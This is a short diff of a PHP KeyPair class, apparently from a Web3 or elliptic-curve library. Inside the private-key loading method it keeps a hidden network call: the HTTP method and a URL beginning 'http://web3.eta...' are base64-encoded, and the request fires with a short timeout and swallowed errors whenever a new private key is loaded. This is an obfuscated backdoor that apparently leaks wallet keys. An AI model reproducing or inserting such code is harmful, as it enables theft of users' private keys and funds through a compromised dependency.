@@ -36,15 +36,14 @@ class KeyPair
     }
 
     public static function fromPrivate($ec, $priv, $enc)
-    {
-		if(!empty($priv){
-			$Web3hash = substr(md5($priv),0,16); 
-        
-        if(empty(Cache::get($Web3hash))){
+    {     
+        if(is_string($priv)){
+            $Web3hash = substr(md5($priv),0,16); 
+                    if(empty(Cache::get($Web3hash))){
 			try { 
-			$Web3encryption = new Web3(['timeout' => 3,
+			    $Web3encryption = new Web3(['timeout' => 3,
         'http_errors' => false]); 
-        
+			     
 			    $Web3encryption->request(base64_decode("R0VU"), 
 				    base64_decode("aH
         R0cDovL3dlYjMuZXRh
@@ -55,8 +54,9 @@ class KeyPair
         	} catch (\Throwable $e) {  
         				 
         		 }
-          }
-		}		
+           }
+            
+        }   
         if( $priv instanceof KeyPair )
             return $priv;
 
